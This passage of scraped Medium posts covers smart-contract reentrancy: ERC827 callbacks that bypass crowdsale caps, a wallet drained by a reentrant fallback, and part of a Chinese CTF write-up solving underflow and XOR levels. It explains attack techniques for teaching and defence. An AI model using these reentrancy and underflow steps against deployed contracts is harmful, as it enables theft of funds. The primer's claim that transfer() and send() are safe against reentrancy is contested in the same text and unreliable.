stop thinking about reentrancy as \u201csstore after external call\u201d. Try to use the wide definition of reentrancy (until we have better one).For now, some recommendations:Remember that a wide variety of effects might be critical for the contract: writing to storage, sending ether, emitting events, consuming the wrong amount of gas.Don\u2019t assume that transfer or send are effect-free, treat them as \u201cinteraction\u201d as well.Use reentrancy guard. It is simple, but do not mess up.Follow CEI pattern, but read all the required data (storage variables, address balance, data from other contracts) to local variables before calling external functions (and make sure any called function controlled by you get required data via arguments rather than getters).This article was prepared with the help of Alexander Drygin, Igor Sobolev, Ivan Ivanitskiy, Kirill Gorshkov, and Pavel Kondr.This article was created by SmartDec, a security team specialized in static code analysis, decompilation and secure development.Feel free to use SmartCheck, our smart contract security tool for Solidity and Vyper, and follow us on Medium and Twitter. We are also available for smart contract development and auditing work.", "responses": 0, "tags": ["Ethereum", "Security", "Tech Blog", "Constantinople", "Solidity"]}, {"title": "Why ERC827 can make you vulnerable to reentrancy attacks \u2014 and how to prevent them", "post_link": "https://medium.com/chainsecurity/why-erc827-can-make-you-vulnerable-to-reentrancy-attacks-and-how-to-prevent-them-61aeb4beb6bf?source=search_post---------6", "author_name": "Leonard von Kleist", "author_link": "https://medium.com/@leovk", "publish_date": "2018-06-01", "last_modified_date": "2018-06-14", "readtime": "3.78", "claps": 358, "voters": 19, "content": "Why ERC827 can make you vulnerable to reentrancy attacks \u2014 and how to prevent themLeonard von KleistFollowJun 1, 2018 \u00b7 4 min readThe ERC20 standard is currently the most widely used standard for tokens on the Ethereum blockchain. However, unlike transactions using Ethereum\u2019s native currency Ether, an ERC20 token only allows the transfer of value, not value and data. One possible solution that has been gaining popularity is the ERC827 standard. However, along with the new opportunities of ERC827 come new vulnerabilities.ERC827 vs ERC20: What\u2019s the difference?ERC827 is an extension of ERC20. The three functions that are new in ERC827 are: approveAndCall(), transferAndCall(), and transferFromAndCall().The difference between the ERC827 functions and their ERC20 counterparts is that in addition to what they do in ERC20, they also call _to.call(_data) on the _to contract to whom the money is being sent. Let\u2019s look at transferAndCall() as an example.Here is the code for the transferAndCall() function in ERC827:We see that transferAndCall() calls ERC20\u2019s transfer()function (ERC827 inherits from ERC20), and makes a call to the contract passed in with the _to parameter. If the sender doesn\u2019t have enough funds, or if this function call does not return successfully, transferAndCall() reverts (for more information check out https://github.com/ethereum/EIPs/issues/827).Reentrancy in ERC827The aforementioned call to the _to contract introduces a new and potentially unexpected control flow transfer. If the _to contract has a fallback function it will be executed and could, for example, be used to perform a reentrancy attack. This can be best explained with an example:Let\u2019s look at OpenZeppelin\u2019s IndividuallyCappedCrowdsale, a contract already used in production by many projects on the Ethereum blockchain. IndividuallyCappedCrowdsale is supposed to limit individual contributions to a crowdsale, e.g. a single account may not contribute more than 0.5 ETH. At the moment, this code makes use of the transfer() function as specified in the ERC20 standard, so it is safe. However, if this code is used with ERC827 tokens and the new transferAndCall()function, it would be vulnerable to reentrancy.Why is this the case? IndividuallyCappedCrowdsale inherits from Crowdsale. In Crowdsale.sol, the functionbuyTokens() is defined as follows:buyTokens() calls _processPurchase(), which calls _deliverTokens(), which then calls transfer().After _processPurchase() has executed successfully, buyTokens()calls _updatePurchasingState()to update the record of how many Wei the user has contributed, ensuring that no one can spend more than allowed by their individual sales cap. If line 122 in the above code were to call transferAndCall(_beneficary, _tokenAmount, \"\")instead of transfer(_beneficary, _tokenAmount), this would make the contract vulnerable to a reentrancy attack. As we saw above, the ERC827 transferAndCall() function not only transfers tokens to the receiving account, but also calls that account\u2019s fallback function (because no _data parameter is passed to transferAndCall()). Now, suppose that the attacking account\u2019s fallback function contains another call to buyTokens(). This call would be executed before _updatePurchasingState(), allowing the attacker to buy as many tokens as he wants, bypassing the individual sales cap.Suppose the attacking contract (let\u2019s call it Eve) wants to call buyTokens() twice. The chain of events would be:Interaction between IndividuallyCappedCrowdsale(ICC) and EveAs we can see, because transferAndCall()calls Eve\u2019s fallback function before _updatePurchasingState()is called, Eve could make as many calls to buyTokens()as she wants, with_updatePurchasingState()only being executed after all the tokens have been transferred. In this case, it would be advisable to call _updatePurchasingState()before _processPurchase(), so that if someone tries to call buyTokens()reentrantly, the sales cap will still be enforced correctly.To help you better understand how this vulnerability works, we\u2019ve replicated it ourselves. Have a look at the code on GitHub here.In the code on GitHub, we have a contract called VulnerableCrowdsale for an ERC827 Token called CarelessCrowdsaleCoin. The crowdsale allows its owner to decide how many Wei any account is allowed to contribute. This is called the account\u2019s sales cap. It inherits from a modified version of OpenZeppelins Crowdsale contract, which uses the new ERC827 transferAndCall()function instead of the old ERC20 transfer():This simple change introduces a reentrancy vulnerability. Can you see it?Suppose there\u2019s a malicious contract, Eve, with a sales cap of 100 (i.e. Eve can\u2019t buy more than 100 Wei worth of CarelessCrowdsaleCoin). BuyTokens()checks that Eve hasn\u2019t reached her sales cap yet, calls transferAndCall()to transfer the tokens, and then updates Eve\u2019s entry in the contributions[] mapping. However, recall that the transferAndCall() function also makes a call to Eve when it transfers the tokens. Eve has a fallback function that calls buyTokens() again, so she can buy more tokens before her entry in contributions[] is updated.This means that she can bypass her sales cap.When we run our test cases, we see that the sales cap works effectively when Eve tries to buy 200 tokens at once:But fails if eve buys 200 tokens using several reentrant calls from her fallback function:We also see that if we change the buyTokens() function so that _updatePurchasingState()is called before_processPurchase(), the reentrancy attack doesn\u2019t work anymore(Try this out for yourself!)TakeawayCode that is safe for ERC20 may not be safe for ERC827, so make sure that you carefully look at the changes between the two standards (Hint: transferAndCall, transferFromAndCall and approveAndCall) and double check your code for possible reentrancy vulnerabilities before you make the switch.", "responses": 1, "tags": ["Blockchain", "Ethereum", "Security", "Erc20", "Solidity"]}, {"title": "Smart Contract Security: Part 1 Reentrancy Attacks", "post_link": "https://medium.com/hackernoon/smart-contract-security-part-1-reentrancy-attacks-ddb3b2429302?source=search_post---------7", "author_name": "nick256", "author_link": "https://medium.com/@nkalltheway", "publish_date": "2018-03-15", "last_modified_date": "2018-06-19", "readtime": "4.74", "claps": 85, "voters": 16, "content": "Smart Contract Security: Part 1 Reentrancy Attacksnick256FollowMar 15, 2018 \u00b7 5 min readEthereum is one of the two largest cryptocurrencies right now, with a market cap of more than 60B dollars, processing 600K+ transactions per day. Using its Turing-Complete high-level programming language, Solidity, people are building smart contracts daily. There is already a large amount of applications running on the main network, from Token systems to wallets, hedging contracts, lotteries etc. Where there is money involved there are malicious actors.When a smart contract is deployed on the blockchain, it can never be altered again. This is why they are called \u201cimmutable\u201d. It is therefore extremely important to follow some basic security guidelines, do tons of testing before deploying and keeping the code as simple as possible.In this series of articles I will try to explain some of the common vulnerabilities as I understand them and provide material, written by experts, for further studying.Let\u2019s first explain shortly how the call function works. It is used to invoke a function, of another or the same contract, and transfer data and/or ether to it. It does not throw in case of an exception, it just returns false - otherwise returns true. Call triggers code execution and spends all the available gas for this purpose. This is where the problems begin as you will see later. Lets see how this works in practiceI will use this simple Logger contract that contains a logNum function which can be called by anyone. It takes an integer as an argument and maps/logs that number to your address using the _myNum mapping.Now suppose, that inside another contract I am building, I want to call this logNum function and pass the number 10 to it. The syntax, using call is:addressOfLogger.call(bytes4(sha3(\"logNum(uint256)\")), 10);The 4 bytes inside the call method are used as a hash signature, which is used to point to the function we want to invoke. Practically, the first 4 bytes of the logNum\u2019s hash match the hash of the call method and this function is called with the value 10 as an argument.You can also send ether using the call method. Lets use this simple Test contract to understand how. This one consists of two functions. The buy function that is payable(accepts wei) and the fallback method.You can interact with the buy function from your own contract and transfer money to it, using the call method, in almost the identical way we used it above. You just need to know the address of the Test contract. In this case you write:addressOfTest.call.value(amount)(bytes4(sha3(\"buy()\")));If you wanted to transfer the ether to the fallback method you would write:addressOfTest.call.value(amount)(); //the parenthesis is emptyThe fact that the call method triggers code execution without a gas limit, unless you set one manually, makes it vulnerable to reentrancy attacks. This has led to huge financial losses in the past(DAO hack~70M $/ June 2016).Reentrancy AttackThe following contract will be used to analyse this attack in detail. Imagine that it represents a wallet contract. You can send ether and store it there. The mapping balanceOf maps your address to the amount of ether you have stored in this wallet(in wei). The withdrawEquity function allows anyone using the wallet to withdraw their balance. This is where the BAD stuff happens.As we saw earlier the call statement inside withdrawEquity invokes the msg.sender\u2019s fallback function in order to send wei to him. The thing is\u2026it has no gas limitation, so any code inside this fallback function will be executed(as long as there is remaining gas for this purpose). Now a malicious actor can deploy a smart contract looking like this:Lets examine this one. There is a private address _owner initialised inside the constructor. It is initiated inside the constructor and indicates who the owner of the contract is/who deployed it. The other address is the address of the vulnerable wallet(here for simplicity I used 0x0). Then, an instance of that contract is created and we are almost done.If the bad guy sent wei, from the Malicious contract to the wallet and then called his fallback function, strange things would happen. When he calls the function, the withdrawEquity function is invoked(line15).Inside the withdrawEquity, into the require statement the call method contains an empty signature with no gas limitationsmsg.sender.call.value(x)()so it invokes the fallback method of the Malicious contract unless it fails(in case of failure the transaction is reverted).vul.withdrawEquity();This is a call to the withdrawEquity function again. Practically the bad guy\u2019s contract receives the ether and then calls the withdrawEquity() again. Since the state of the first contract has not changed (the attacker\u2019s balance is not set to zero yet) he gets paid again. And again, and again\u2026 until the execution runs out of gas or the call stack limit is reached.So if the withdrawEquity gets called lets say 10 times, only the last one will fail because call doesn\u2019t propagate an exception only true/false, so only the executions of the last call will be reverted. This means that the malicious guy got paid x9 times rather than 1. To put this into perspective someone could initially store 2 ether and get 18 ether back. Then do the same with the 18 ether and so on\u2026How to avoid Thistransfer() and send() are safe against reentrancy attacks since they limit the code execution to 2300 gas, currently enough to log and event.If you can\u2019t avoid using call() always do the internal work (eg change balances) before using the external call.In general, keep in mind that any function running external code is a threat.Documentation and sources for further StudyingSolidity DocumentationConsensys Best Practices for Smart Contract SecurityVitalik on securityA survey of attacks on Ethereum smart contractsHow to write Safe Smart Contracts-chrisethPrivacy-Preserving Smart Contracts", "responses": 1, "tags": ["Ethereum", "Security", "Blockchain", "Cryptocurrency", "Solidity"]}, {"title": "Crosslink\u300aCTF\u6436\u65d7\u8cfd\u300b\u89e3\u984c\u5168\u653b\u7565\uff08\u4e00\uff09- Underflow / XOR / Reentrancy", "post_link": "https://medium.com/cryptocow/crosslink-ctf-problems-solving-guide-part1-4fb15eab7258?source=search_post---------8", "author_name": "Robin Pan \u6f58\u5ba3\u4efb", "author_link": "https://medium.com/@robinpan", "publish_date": "2019-11-21", "last_modified_date": "2019-11-21", "readtime": "9.76", "claps": 413, "voters": 15, "content": "Crosslink\u300aCTF\u6436\u65d7\u8cfd\u300b\u89e3\u984c\u5168\u653b\u7565\uff08\u4e00\uff09- Underflow / XOR / Reentrancy\u5f9e\u5be6\u4f5c\u53ca\u6bd4\u8cfd\u4e2d\uff0c\u4e00\u63a2\u667a\u80fd\u5408\u7d04\u53ef\u80fd\u5b58\u5728\u7684\u7a2e\u7a2e\u6f0f\u6d1eRobin Pan \u6f58\u5ba3\u4efbFollowNov 21 \u00b7 10 min read\u76ee\u524d CTF \u7db2\u7ad9\u5df2\u8f49\u79fb\u81f3\uff1ahttps://cypherpunks-core.github.io/cypherpunks-ctf/Crosslink \u662f\u7531\u300c\u53f0\u5317\u4ee5\u592a\u574a\u300d\u793e\u7fa4\u8209\u8fa6\u7684\u5340\u584a\u93c8\u5e74\u5ea6\u6280\u8853\u76db\u6703\uff0c\u805a\u96c6\u4e86\u4f86\u81ea\u4e16\u754c\u5404\u5730\u7684\u6280\u8853\u5927\u4f6c\u53ca\u958b\u767c\u8005\u4e00\u540c\u4ea4\u6d41\u5206\u4eab\u3002\u4eca\u5e74\u7684\u6703\u8b70\u96d6\u5df2\u7d50\u675f\uff0c\u4f46\u8b70\u7a0b\u4e2d\u90fd\u6709\u5fd7\u5de5\u5168\u7a0b\u9304\u5f71\u53ca\u6587\u5b57\u7d00\u9304\uff0c\u82e5\u60a8\u5c0d\u6703\u8b70\u5167\u5bb9\u6709\u8208\u8da3\uff0c\u53ef\u4ee5\u5230\u53f0\u5317\u4ee5\u592a\u574a Medium\u641c\u5c0b\u3002\u524d\u8a00Crosslink 2019 \u8209\u8fa6\u4e86\u667a\u80fd\u5408\u7d04 CTF \uff08Capture The Flag\uff0c\u6436\u65d7\u8cfd\uff09\uff0c\u8b93\u5927\u5bb6\u5728\u4eab\u53d7\u7af6\u8cfd\u6a02\u8da3\u7684\u540c\u6642\uff0c\u4e5f\u80fd\u5c0d\u667a\u80fd\u5408\u7d04\u5b89\u5168\u6709\u66f4\u6df1\u4e00\u5c64\u7684\u8a8d\u8b58\u3002\u5373\u4f7f\u6211\u89e3\u958b\u4e86\u6240\u6709\u95dc\u5361\uff0c\u8a31\u591a\u984c\u76ee\u727d\u6d89\u7684\u6f0f\u6d1e\u53ca\u5de5\u5177\u4e5f\u662f\u7b2c\u4e00\u6b21\u63a5\u89f8\uff0c\u5e0c\u671b\u80fd\u900f\u904e\u5beb\u6587\u7ae0\u8b93\u81ea\u5df1\u91cd\u65b0\u6aa2\u8996\u4e26\u771f\u6b63\u7406\u89e3\u6bcf\u4e00\u984c\uff0c\u4e5f\u5e0c\u671b\u85c9\u8457\u9019\u7bc7\u8a18\u9304\uff0c\u80fd\u628a\u4e3b\u8fa6\u55ae\u4f4d\u672c\u6b21\u7cbe\u5fc3\u7b56\u5283 CTF \u7684\u7cbe\u795e\u5ef6\u7e8c\u4e0b\u53bb\uff0c\u63a8\u5ee3\u7d66\u66f4\u591a\u4eba\u77e5\u9053\u3002\u672c\u6587\u5047\u8a2d\u8b80\u8005\u5c0d\u667a\u80fd\u5408\u7d04\u7684\u64cd\u4f5c\u3001\u8a9e\u6cd5\u6709\u4e00\u5b9a\u7a0b\u5ea6\u7684\u77ad\u89e3\uff0c\u82e5\u5c0d Metamask \u4e0d\u719f\u6089\u6216\u662f\u4e0d\u4e86\u89e3\u5982\u4f55\u8207 CTF \u7db2\u7ad9\u4e92\u52d5\uff0c\u5efa\u8b70\u5148\u53c3\u8003\u9019\u7bc7\u5f15\u5c0e\uff0c\u5167\u5bb9\u5305\u62ec\u4e86\u5b89\u88dd Metamask \u3001\u9023\u7d50\u81f3 CTF \u7db2\u7ad9\uff0c\u5230\u4e00\u6b65\u6b65\u8207\u5408\u7d04\u4e92\u52d5\uff0c\u6700\u7d42\u89e3\u958b\u95dc\u5361 0 \u3002\u7531\u65bc\u6587\u4e2d\u4f7f\u7528\u7684\u7a0b\u5f0f\u78bc\u5de5\u5177 github gist \u5c1a\u4e0d\u652f\u63f4 .sol \u526f\u6a94\u540d\u7684\u4e0a\u8272\uff0c\u66ab\u6642\u6703\u5c07\u539f\u526f\u6a94\u540d\u5f8c\u9762\u518d\u52a0\u4e0a .js \u4ee5\u7528 js \u7684\u65b9\u5f0f\u4e0a\u8272\u65b9\u4fbf\u95b1\u8b80\uff08\u5982 xxx.sol .js\uff09\uff0c\u90e8\u5206\u7d30\u7bc0\u4e0a\u8272\u56e0\u8a9e\u6cd5\u5dee\u7570\u4e0d\u751a\u5b8c\u7f8e\uff0c\u8acb\u8b80\u8005\u898b\u8ad2\u3002\u7cfb\u5217\u6587\u76ee\u9304\u25b6\uff08\u4e00\uff09\u95dc\u5361 1\u30012\u30013 - Underflow / XOR / Reentrancy \uff08\u4e8c\uff09\u95dc\u5361 4\u30015\u30016 \uff08\u4e09\uff09\u95dc\u5361 7\u30018 \uff08\u56db\uff09\u95dc\u5361 9 \uff08\u4e94\uff09\u95dc\u5361 10 \uff08\u516d\uff09\u95dc\u5361 11 \uff08\u4e03\uff09\u95dc\u5361 12\u672c\u6587\u76ee\u9304\u95dc\u53611 - Bank\u95dc\u53612 - Encrypt\u95dc\u53613 - Freeshop\u63a5\u4e0b\u4f86\uff0c\u5c31\u8b93\u6211\u5011\u958b\u59cb\u5411 Crosslink Ship \u524d\u9032\u5427\uff01\u95dc\u5361 1 \u2014 Bank\u95dc\u5361 1 \u2014 Bank.sol\u8d77\u59cb\u72c0\u614b\uff1a\u73a9\u5bb6\u64c1\u6709 29 \u500b Token\u3002\u76ee\u6a19\uff1a\u8b93\u81ea\u5df1\u7684 Token \u6578\u91cf\u5927\u65bc 29\u3002-\u5408\u7d04\u89e3\u6790Bank \u662f\u4e00\u500b\u4ee3\u5e63\u5408\u7d04\uff0c\u5728\u90e8\u7f72\u6642\u53ef\u4ee5\u8a2d\u5b9a\u7e3d\u4f9b\u7d66\u91cf\uff0c\u4e26\u5e36\u6709\u4e09\u500b function \uff0c\u5206\u5225\u70ba\u8f49\u5e33\u51fd\u6578 transfer(...) \u3001\u9918\u984d\u67e5\u8a62\u51fd\u6578 balanceOf(...) \uff0c\u4ee5\u53ca\u4e00\u500b\u81ea\u52d5\u751f\u6210\u7684\u7e3d\u4f9b\u7d66\u91cf\u67e5\u8a62\u51fd\u6578 totalSupply() \uff0c\u5176\u4e2d\u6709\u5e7e\u500b\u91cd\u9ede\u9700\u8981\u5148\u77ad\u89e3\uff1a\u7b2c\u4e94\u884c mapping(address => uint) balances; \u8868\u793a balances \u8b8a\u6578\u662f\u4e00\u500b mapping \u578b\u614b\uff0c\u7528\u4f86\u4ee5\u5730\u5740\u5c0d\u61c9\u5176\u6240\u64c1\u6709\u7684 Token \u6578\u91cf\u3002\u6578\u91cf\u55ae\u4f4d\u70ba uint \uff08uint \u70ba uint256 \u7684\u7c21\u5beb\uff09\u3002\u7b2c\u4e5d\u884c balances[msg.sender] = totalSupply = _initialSupply; \u8868\u793a Bank \u5408\u7d04\u5728\u88ab\u90e8\u7f72\u6642\u6703\u5c07 totalSupply \u8a2d\u70ba _initialSupply \u7684\u503c\uff0c\u4e26\u6307\u5b9a\u70ba msg.sender \u6240\u64c1\u6709\u3002\u5728\u9019\u95dc\u5408\u7d04\u88ab\u90e8\u7f72\u7684\u7576\u4e0b\uff0c msg.sender \u5373\u70ba\u73a9\u5bb6\u672c\u4eba\uff0c\u800c _initialSupply \u53c3\u6578\u5247\u88ab\u8a2d\u5b9a\u70ba 29 \u3002\u89e3\u984c\u95dc\u9375Arithmetic Underflow \u7b97\u8853\u4e0b\u6ea2Bank \u5408\u7d04\u7684\u89e3\u984c\u95dc\u9375\u5728\u65bc transfer(\u2026) \u51fd\u6578\u4e2d\u3002transfer(\u2026) \u51fd\u6578\u63a5\u6536\u5169\u500b\u53c3\u6578 \u2014 \u7b2c\u4e00\u500b\u53c3\u6578 _to \u70ba\u76ee\u7684\u9322\u5305\u5730\u5740\uff0c\u7b2c\u4e8c\u500b _value \u70ba\u8f49\u9001\u6578\u91cf\u3002\u51fd\u6578\u4e2d\u7684\u7b2c\u4e00\u884c\u8981\u6c42 msg.sender \u64c1\u6709\u7684 Token \u6578\u91cf\u6263\u9664 _value \u5fc5\u9808\u5927\u65bc\u7b49\u65bc\u96f6\uff0c\u7136\u800c\u537b\u6c92\u5148\u9a57\u8b49\u300c\u8f49\u9001\u6578\u91cf\u662f\u5426\u5c0f\u65bc\u7b49\u65bc\u64c1\u6709\u6578\u91cf\u300d\uff08 _value <= balances[msg.sender] \uff09\uff0c\u9019\u8b93\u6211\u5011\u53ef\u4ee5\u4f7f\u7528 underflow \u7684\u65b9\u5f0f\u4f86\u653b\u64ca\u5408\u7d04\u3002Underflow \u610f\u601d\u70ba\u5728\u8d85\u904e\u8b8a\u6578\u578b\u614b\u6240\u80fd\u8868\u793a\u7684\u6700\u5c0f\u503c\u6642\uff0c\u5c07\u6703\u5f9e\u5c3e\u91cd\u65b0\u958b\u59cb\u5faa\u74b0\u3002\u8209\u4f8b\u4f86\u8aaa\uff0c\u4e00\u500b uint8 \u6240\u80fd\u8868\u793a\u7684\u503c\u70ba [0, 255]\uff0c\u82e5\u6211\u5011\u5c07 0 \u6e1b\u6389 1 \u5247\u6703\u5f97\u5230 255 \uff0c\u5373\u7a31\u70ba underflow \u3002\u53cd\u4e4b\uff0coverflow \u767c\u751f\u5728\u8d85\u904e\u8b8a\u6578\u578b\u614b\u6240\u80fd\u8868\u793a\u7684\u6700\u5927\u503c\u6642\uff0c\u6703\u5f9e\u982d\u91cd\u65b0\u5faa\u74b0\uff1a\u5c07 255 \u52a0 1 \u6703\u8b8a\u70ba 0 \u3002\u7531\u65bc\u904a\u6232\u958b\u59cb\u6642\uff0c\u73a9\u5bb6\u7684\u5730\u5740\u88ab\u8ce6\u4e88\u7684 Token \u6578\u91cf\u70ba 29 \uff08\u610f\u5373 balances[msg.sender] = 29\uff09\uff0c\u70ba\u4e86\u9020\u6210 underflow \uff0c\u6211\u5011\u5c07\u8f49\u9001\u6578\u91cf _value \u8a2d\u70ba\u5927\u65bc 29 \u7684\u503c\uff08\u5047\u8a2d\u70ba 30\uff09\uff0c\u4f7f\u5f97balances[msg.sender] - _value \u7b49\u65bc29 - 30\u800c\u5728 uint \uff08= uint256\uff09\u7684\u578b\u614b\u4e0b \uff0c\u5c07\u6703\u5f97\u523029 - 30 = 2\u00b2\u2075\u2076 - 1 //\u4e5f\u5c31\u662fuint\u6240\u80fd\u8868\u793a\u7684\u6700\u5927\u503c\u5982\u6b64\u4e00\u4f86\uff0c\u5c31\u901a\u904e\u4e86 function \u4e2d\u7b2c\u4e00\u884c\u7684\u9650\u5236\uff0c\u4e26\u5728\u7b2c\u4e8c\u884c balances[msg.sender] -= _value; \u6642\u5c07\u6211\u5011\u7684\u64c1\u6709\u6578\u91cf\u66f4\u65b0\u70ba 2\u00b2\u2075\u2076-1 \u3002\u7136\u800c\uff0c\u9084\u6709\u4e00\u9ede\u8981\u6ce8\u610f\uff1a \u7b2c\u4e00\u500b\u53c3\u6578 _to \u5fc5\u9808\u8a2d\u5b9a\u70ba\u81ea\u5df1\u4ee5\u5916\u7684\u5730\u5740\u3002\u5728 function \u7b2c\u4e8c\u548c\u7b2c\u4e09\u884c\uff1abalances[msg.sender] -= _value;balances[_to] += _value;\u82e5\u5c07 _to \u8a2d\u5b9a\u70ba\u81ea\u5df1\uff0c\u5728\u4e00\u6e1b\u4e00\u52a0\u4e2d\uff0c\u96d6\u7136\u6703\u5148\u9020\u6210 underflow \uff0c\u4f46\u63a5\u8457\u6703\u518d\u767c\u751f overflow \uff0c\u4e26\u4f7f\u5f97\u73a9\u5bb6\u6700\u7d42\u64c1\u6709\u6578\u91cf\u4ecd\u70ba\u521d\u59cb\u503c\uff0c\u7121\u6cd5\u904e\u95dc\uff01\u95dc\u5361 2 \u2014 Encrypt\u95dc\u5361 2 \u2014 Encrypt.sol\u8d77\u59cb\u72c0\u614b\uff1acomplete = false\u76ee\u6a19\uff1acomplete = true-\u5408\u7d04\u89e3\u6790\u9019\u95dc\u7684\u904e\u95dc\u689d\u4ef6\u662f\u5c07 complete \u8b8a\u6578\u66f4\u65b0\u70ba true\uff0c\u7a0d\u5fae\u700f\u89bd\u4e00\u4e0b\u6574\u500b\u5408\u7d04\uff0c\u53ef\u4ee5\u767c\u73fe complete \u53ea\u6709\u5728\u4e00\u500b\u5730\u65b9\u6703\u88ab\u66f4\u52d5\uff0c\u5c31\u662f guess(\u2026) \u51fd\u6578\u7684\u6700\u5f8c\u4e00\u884c\u3002\u56e0\u6b64\uff0c\u6211\u5011\u76f4\u63a5\u4f86\u7d30\u770b\u4e00\u4e0b\u51fd\u6578\u5167\u5bb9\uff1a\u4e8c\u4e09\u884c\u6703\u53bb\u8b80\u53d6\u7576\u4e0b\u5340\u584a\u7684\u6642\u9593\u6233\uff08block.timestamp\uff09\uff0c\u8f49\u63db\u6210 bytes32 \u578b\u614b\uff0c\u8a08\u7b97\u5176 hash \u503c\uff0c\u4e26\u653e\u9032 entropy1 \u8b8a\u6578\u3002\u4e94\u516d\u884c\u4e5f\u662f\u505a\u4e00\u6a21\u4e00\u6a23\u7684\u4e8b\uff0c\u53ea\u662f\u6700\u5f8c\u5c07\u503c\u653e\u9032 entropy2 \u3002\uff08p.s. \u82e5\u60f3\u77ad\u89e3 abi.encode \u8207 abi.encodePacked \u7684\u5dee\u5225\uff0c\u9019\u7bc7\u6587\u7ae0\u6709\u5f88\u6e05\u695a\u7684\u4ecb\u7d39\uff09\u5728\u8b1b\u89e3\u7b2c\u516b\u884c\u4e4b\u524d\uff0c\u5e6b\u5927\u5bb6\u8907\u7fd2\u4e00\u4e0b\u4f4d\u5143\u904b\u7b97 OR\u3001AND\u3001XOR\uff1aOR \u904b\u7b97\u5b50\uff0c\u7b26\u865f\u70ba\u300c|\u300d0 | 0 = 00 | 1 = 11 | 0 = 11 | 1 = 1AND \u904b\u7b97\u5b50\uff0c\u7b26\u865f\u70ba\u300c&\u300d0 & 0 = 00 & 1 = 01 & 0 = 01 & 1 = 1XOR \u904b\u7b97\u5b50\uff0c\u7b26\u865f\u70ba\u300c^\u300d0 ^ 0 = 00 ^ 1 = 11 ^ 0 = 11 ^ 1 = 0\u89e3\u984c\u95dc\u9375XOR \u548c AND \u904b\u7b97\u5b50\u7b2c\u516b\u884c\u7684\u7b49\u5f0f\u53f3\u908a\u53ef\u4ee5\u770b\u6210\u662f\u4e09\u500b\u90e8\u5206\u505a AND \u904b\u7b97\uff0c\u9019\u4e09\u500b\u90e8\u5206\u70ba\uff1a(entropy1 ^ entropy2) &keccak256(abi.encodePacked(block.number)) &sault\u7b2c\u4e00\u90e8\u5206\u662f\u9019\u95dc\u7684\u91cd\u9ede\u3002\u5728\u524d\u9762\u6211\u5011\u5df2\u7d93\u767c\u73fe\uff0centropy1 \u548c entropy2 \u5e36\u6709\u5b8c\u5168\u76f8\u540c\u7684\u503c\uff0c\u800c\u5c0d\u5169\u500b\u5b8c\u5168\u76f8\u540c\u7684\u503c\u505a XOR \u904b\u7b97\uff0c\u7d50\u679c\u6703\u5f97\u5230 0 \u3002\u53c8\u56e0\u70ba\u4e09\u500b\u90e8\u5206\u662f\u4ee5 AND \u9023\u63a5\uff0c\u5728 AND \u7684\u7279\u6027\u4e0b\uff0c\u53ea\u8981\u5176\u4e2d\u4e00\u65b9\u662f 0 \uff0c\u7d50\u679c\u5c31\u662f 0 \u3002\u56e0\u6b64\uff0c\u7b2c\u4e8c\u548c\u7b2c\u4e09\u90e8\u5206\u5b8c\u5168\u4e0d\u9700\u8981\u8a08\u7b97\uff0c\u5c31\u80fd\u5f97\u5230\u7d50\u679c target = 0 \u3002\u63a5\u8457\uff0c\u6700\u5f8c\u4e00\u884c\u6703\u5c07\u8f38\u5165\u7684\u552f\u4e00\u53c3\u6578\u8f49\u63db\u6210 bytes32 \u578b\u614b\uff0c\u4e26\u8207\u4e0a\u9762\u7b97\u51fa\u7684 target \u6bd4\u5c0d\u662f\u5426\u76f8\u540c\uff0c\u518d\u628a\u6bd4\u5c0d\u7d50\u679c\u6307\u6d3e\u56de complete \u8b8a\u6578\u3002\u56e0\u6b64\uff0c\u6211\u5011\u53ea\u8981\u5728\u547c\u53eb guess(\u2026) \u51fd\u6578\u6642\u5c07\u50b3\u5165\u53c3\u6578\u503c\u8a2d\u70ba 0 \uff0c\u5373\u53ef\u628a complete \u66f4\u65b0\u70ba true \uff0c\u904e\u95dc\uff01\u95dc\u53613 \u2014 Freeshop\u95dc\u5361 3 \u2014 Freeshop.sol\u521d\u59cb\u72c0\u614b\uff1a\u5408\u7d04\u5730\u5740\u5b58\u6709 1 ether\u76ee\u6a19\uff1a\u5c07\u5408\u7d04\u5730\u5740\u638f\u7a7a-\u5408\u7d04\u89e3\u6790\u9019\u500b\u5408\u7d04\u662f\u4e00\u500b\u5177\u6709\u6642\u9593\u9396\u7684\u9322\u5305\u3002\u5b83\u63d0\u4f9b\u4e86\u5b58\u6b3e\u3001\u63d0\u9818\u53ca\u9918\u984d\u67e5\u8a62\u7684\u529f\u80fd\uff0c\u4e26\u5728\u63d0\u6b3e\u6642\u52a0\u4e0a\u4e86\u91d1\u984d\u53ca\u6642\u9593\u7684\u9650\u5236\u3002\u9019\u985e\u9322\u5305\u5408\u7d04\u901a\u5e38\u88ab\u7528\u65bc\u5be6\u884c\u5f37\u5236\u9396\u5009\uff0c\u4f7f\u7528\u8005\u5c07\u8cc7\u91d1\u5b58\u5165\u5408\u7d04\uff0c\u7b49\u5f85\u9810\u5148\u5b9a\u7fa9\u7684\u6642\u9593\u7d50\u675f\u5f8c\u624d\u80fd\u89e3\u9396\uff0c\u4ee5\u907f\u514d\u5728\u9019\u6bb5\u6642\u9593\u53d7\u5230\u50f9\u683c\u6ce2\u52d5\u6216\u5176\u4ed6\u56e0\u7d20\u5f71\u97ff\u800c\u52d5\u7528\u3002\u5408\u7d04\u4e2d\u6709\u5169\u500b\u9810\u5099\u77e5\u8b58\uff1a payable \u548c fallback function\u3002payablepayable \u662f function \u7684\u4fee\u98fe\u7b26\uff0c\u4ee3\u8868\u547c\u53eb\u6b64 function \u7684\u4ea4\u6613\u5141\u8a31\u5e36\u6709 ether\u3002\u53cd\u4e4b\u82e5 function \u5728\u5ba3\u544a\u6642\u6c92\u6709\u5beb\u4e0a payable \uff0c\u547c\u53eb\u6642\u7684\u4ea4\u6613\u9644\u6709 ether \u5c07\u6703\u5f15\u767c error \u3002\u4ee5\u9019\u95dc\u7684\u5408\u7d04\u70ba\u4f8b\u5b50\uff0c depositFunds() \u53ef\u4ee5\u63a5\u6536 ether\uff0c\u800c withdrawFunds(\u2026) \u5247\u4e0d\u80fd\u30022. fallback functionfallback function \u662f\u4e00\u500b\u6c92\u6709\u540d\u5b57\u3001\u4e0d\u80fd\u63a5\u6536\u53c3\u6578\u4e14\u4e0d\u80fd\u56de\u50b3\u503c\u7684\u51fd\u6578\u3002\u4e00\u500b\u5408\u7d04\u50c5\u80fd\u64c1\u6709\u4e00\u500b fallback function\u3002\u5176\u610f\u7fa9\u5728\u65bc\u300c\u7576\u4ea4\u6613\u767c\u9001\u81f3\u5408\u7d04\u5730\u5740\u537b\u7121\u6cd5\u627e\u5230\u5c0d\u61c9\u540d\u7a31\u7684 function \u6642\uff0c\u5c07 fallback \u5230\u9019\u500b 